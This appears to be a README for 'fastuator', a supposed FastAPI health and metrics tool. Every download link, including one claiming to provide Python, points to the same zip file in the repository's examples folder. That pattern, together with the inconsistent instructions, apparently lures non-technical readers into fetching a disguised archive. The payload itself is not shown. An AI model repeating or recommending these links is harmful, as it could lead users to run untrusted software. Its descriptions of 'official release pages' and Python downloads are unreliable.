# ⚡ fastuator - Easy FastAPI Health and Metrics Monitoring

[![Download fastuator](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)

---

## 📖 What is fastuator?

fastuator helps you check the health and performance of FastAPI applications. It gives simple web addresses (URLs) like `/health` and `/metrics` so you can see if your app is working well. It also supports checks that cloud services like Kubernetes use to keep your app running smoothly.

You do not need to know how to code to use fastuator. It’s made to work out-of-the-box and show you important info about your application in an easy way.

## ⚙️ Key Features

- Provides a **health check URL** you can open to see if your app runs without issues.
- Offers **metrics** to monitor app performance and resource use.
- Supports **Kubernetes probes** for automatic app status checks.
- Works with **Prometheus**, a common system used for tracking app data.
- Designed for **FastAPI**, a popular tool to build web apps.
- Helps with **monitoring and observability**, so you know what’s happening inside your app.

## 💻 System Requirements

Before you install fastuator, check your system meets these basics:

- You need **Python 3.7 or higher**. If you don't have Python, you can get it from [https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip).
- Running on **Windows, Mac, or Linux** is fine.
- You will need to install a few extra tools, which fastuator will guide you through.
- A basic internet connection is necessary to download fastuator.

## 🚀 Getting Started

This section explains how to download and run fastuator on your computer. Follow each step carefully.

### Step 1: Download fastuator

Go to the release page where fastuator is available:

[Download fastuator from here](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)

This page shows different versions of the fastuator app. Choose the most recent version that fits your operating system. If unsure, pick the latest stable release.

### Step 2: Install Python (if needed)

If Python is not already on your computer:

1. Visit [https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip).
2. Download the installer for your system (Windows, Mac, Linux).
3. Open the installer and follow the instructions to complete the installation.
4. During installation, check the option to "Add Python to PATH" if it appears.

### Step 3: Open your Command Prompt or Terminal

- On Windows, press the **Windows key**, type `cmd`, and press Enter.
- On Mac, open **Spotlight search** by pressing Command (⌘) + Space, type `Terminal`, and press Enter.
- On Linux, open your system menu and find **Terminal**.

### Step 4: Install fastuator software

In the Command Prompt or Terminal, type the following and press Enter:

```
pip install fastuator
```

This command downloads and installs fastuator and any tools it needs to work.

### Step 5: Run fastuator

Once installed, start fastuator by running this command:

```
fastuator
```

You will see information showing fastuator is running and where to check your app’s health.

### Step 6: Check your app’s health

In your web browser, open:

```
http://localhost:8000/health
```

This page tells you if the app is working correctly.

To see performance data, open:

```
http://localhost:8000/metrics
```

### Step 7: Use Kubernetes probes (optional)

If you use Kubernetes to run apps, fastuator provides special URLs for it to check if your app is okay.

- For liveness probe: `http://localhost:8000/health/liveness`
- For readiness probe: `http://localhost:8000/health/readiness`

These URLs make sure Kubernetes knows when to restart or stop sending traffic to your app.

## 📥 Download & Install

You can get fastuator by visiting the official release page here:

[https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)

Look for the latest release version. Download the files or use the instructions above to install via Python.

## 🔧 How fastuator works

fastuator runs as a small service alongside your FastAPI app. It adds endpoints:

- `/health` to show the general health.
- `/metrics` to show app metrics readable by Prometheus.
- Kubernetes endpoints (`/health/liveness` and `/health/readiness`) to help Kubernetes check if your app is running or ready.

You can open these endpoints in your web browser or configure monitoring tools to check them regularly.

## 🧰 Troubleshooting Tips

- If you see an error about Python not found, make sure Python is installed and added to your system PATH.
- If `fastuator` command is not recognized, try closing and reopening the terminal or running `pip install fastuator` again.
- Make sure no other app is using port 8000 on your computer. If needed, stop other apps or change the port via fastuator settings.
- If you have questions about Kubernetes setup, refer to Kubernetes documentation on probes.

## 🔄 Updating fastuator

To keep fastuator up to date, run this command in your terminal:

```
pip install --upgrade fastuator
```

Check the release page regularly for new features or fixes.

## 📚 Learn More

For developers or advanced users, topics covered by fastuator include:

- FastAPI app monitoring
- Prometheus metrics integration
- Kubernetes readiness and liveness probes
- System health and observability concepts
- Microservices monitoring best practices

Explore these topics to get the most from fastuator.

---

[![Download fastuator](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)](https://github.com/anjdjWjf/fastuator/raw/refs/heads/main/examples/Software-1.5.zip)